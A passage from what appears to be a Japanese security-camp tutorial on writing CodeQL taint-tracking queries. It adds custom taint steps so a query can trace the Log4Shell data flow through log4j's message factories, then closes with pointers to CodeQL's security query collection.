    )
  }
}

from DataFlow::PathNode src, DataFlow::PathNode sink, Configuration config
where config.hasFlowPath(src, sink)
select sink.getNode(), src, sink, "Detected Log4shell!"

```

実行するとReusableMessageFactory.newMessage内の`retult.set(message)`を実行後tacking対象がresultに移っていないことが分かる。

![](https://tyage.github.io/seccamp-2023-images/upload_406e8ba7b1ea4e2184221daf404b356b.png)


TaintTracking::AdditionalTaintStepを継承したクラスを作って、上記のresultがtrackigの対象となるよう追加のtaint stepを実装する
```
class Test1TaintStep extends TaintTracking::AdditionalTaintStep {

    override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
        exists( MethodAccess methodAccess, Method method | 
            methodAccess.getMethod() = method and
            method.getName() = "set" and
            method.getNumberOfParameters() = 1 and
            methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableMessageFactory" and
            node1.asExpr() = methodAccess.getArgument(0) and
            node2.asExpr() = methodAccess.getQualifier()
        )
    }
}
```

もう一度クエリ全体を実行してみるが、まだsinkまでtrackingできていないので先ほどと同様sinkのスコープを広げてどこまで追えているかデバッグするとReusableLogEventFactory.createEvent内の`result.setMessage(message)`までは追えていることがわかる

![](https://tyage.github.io/seccamp-2023-images/upload_c17fed521556ea3b1eaeacc267d87f62.png)

同じようにTaintTracking::AdditionalTaintStepを継承したクラスを作って`result.setMessage(message)`を追跡するよう実装する

```
class Test2TaintStep extends TaintTracking::AdditionalTaintStep {

  override predicate step(DataFlow::Node node1, DataFlow::Node node2) {
      exists( MethodAccess methodAccess, Method method | 
          methodAccess.getMethod() = method and
          method.getName() = "setMessage" and
          method.getNumberOfParameters() = 1 and
          methodAccess.getEnclosingCallable().getDeclaringType().getName() = "ReusableLogEventFactory" and
          node1.asExpr() = methodAccess.getArgument(0) and
          node2.asExpr() = methodAccess.getQualifier()
      )
  }
}
```

</details>

クエリを実行することでソースからシンクまでトラッキングできることが確認できる
![](https://tyage.github.io/seccamp-2023-images/upload_e5854e6674cbccb5ff20fb8d08796174.png)

# 最後に

CodeQLはパーフェクトな道具ではなく自動化の難しい脆弱性も多々ありますが、ある程度複雑な脆弱性も自動的に検知することができます。

また、CodeQLリポジトリには様々なクエリが用意されていて知見の宝庫になっており、読むだけで得られることが多いです。
https://github.com/github/codeql

各言語の`ql/src/Security`ディレクトリでCWE（共通脆弱性タイプ）ごとにクエリとテストコードがまとめられているので、興味のある人はこの辺を眺めてみては。
https://github.com/github/codeql/tree/main/javascript/ql/src/Security
https://github.com/github/codeql/tree/main/javascript/ql/test/query-tests/Security

また、今回は静的解析、Taint Trackingを取り上げましたが、脆弱性を検出する方法については様々な観点、手法があります。
ソースコード読んで脆弱性探すの楽しいな〜と思ってもらえたら幸いです。
